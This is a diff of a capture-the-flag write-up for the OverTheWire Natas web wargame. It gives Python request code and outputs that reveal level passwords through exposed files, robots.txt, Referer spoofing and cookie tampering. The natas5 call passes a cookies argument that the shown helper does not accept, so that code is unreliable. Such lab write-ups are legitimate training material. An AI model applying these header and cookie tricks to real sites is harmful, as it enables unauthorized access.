@@ -18,11 +18,11 @@ https://overthewire.org/wargames/natas/
 
 ## NatasX
 ```python
-def natasX(x, pwd, endpoint = ""):
+def natasX(x, pwd, endpoint="", headers={}):
     url = f'http://natas{x}.natas.labs.overthewire.org/{endpoint}'
     username = f"natas{x}"
 
-    r = requests.get(url, auth=(username, pwd))
+    r = requests.get(url, auth=(username, pwd), headers=headers)
 
     print(r.text)
  ```
@@ -39,7 +39,7 @@ https://overthewire.org/wargames/natas/natas0.html
 > URL:      http://natas0.natas.labs.overthewire.org
 
 ```python
-natasX.natasX(0,"natas0")
+print(natasX.natasX(0,"natas0").text)
 ```
 
 **Output**
@@ -64,7 +64,7 @@ https://overthewire.org/wargames/natas/natas1.html
 
 
 ```python
-natasX.natasX(1,"gtVrDuiDfck831PqWsLEZy5gyDz1clto")
+print(natasX.natasX(1,"gtVrDuiDfck831PqWsLEZy5gyDz1clto").text)
 ```
 
 **Output**
@@ -92,13 +92,13 @@ https://overthewire.org/wargames/natas/natas2.html
 
 ```python
 natas = natasX
-# natas.natasX(2,"ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi")
-natas.natasX(2,"ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi","files/users.txt")
+# print(natas.natasX(2,"ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi").text)
+print(natas.natasX(2,"ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi","files/users.txt").text)
 ```
 
 **Output**
 
-```txt
+```text
 # username:password
 alice:BYNdCesZqW
 bob:jw2ueICLvT
@@ -120,11 +120,12 @@ https://overthewire.org/wargames/natas/natas3.html
 ```python
 natas = natasX
 
-# natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14")
-# natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/robots.txt")
-# natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/s3cr3t/")
-natas.natasX(3, "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/s3cr3t/users.txt")
+# print(natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14").text)
+# print(natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/robots.txt").text)
+# print(natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/s3cr3t/").text)
+print(natas.natasX(3, "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/s3cr3t/users.txt").text)
 ```
+
 
 **Output**
 
@@ -142,8 +143,8 @@ https://overthewire.org/wargames/natas/natas4.html
 > URL:      http://natas4.natas.labs.overthewire.org
 
 ```python
-# natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ")
-natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ", "", {'referer': "http://natas5.natas.labs.overthewire.org/"})
+# print(natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ").text)
+print(natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ", "", {'referer': "http://natas5.natas.labs.overthewire.org/"}).text)
 ```
 
 **Output**
@@ -167,4 +168,47 @@ https://overthewire.org/wargames/natas/natas5.html
 > URL:      http://natas5.natas.labs.overthewire.org
 
 ```python
+print(natas.natasX(5, "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq", cookies={'loggedin': '1'}).text)
+```
+
+**Output**
+
+```html
+<div id="content">
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+</body>
+```
+
+## Natas6
+https://overthewire.org/wargames/natas/natas6.html
+
+> Natas Level 5 → Level 6
+
+> Username: natas6
+
+> URL:      http://natas6.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
+```
+
+## Natas7
+https://overthewire.org/wargames/natas/natas7.html
+
+> Natas Level 6 → Level 7
+
+> Username: natas7
+
+> URL:      http://natas7.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
 ```
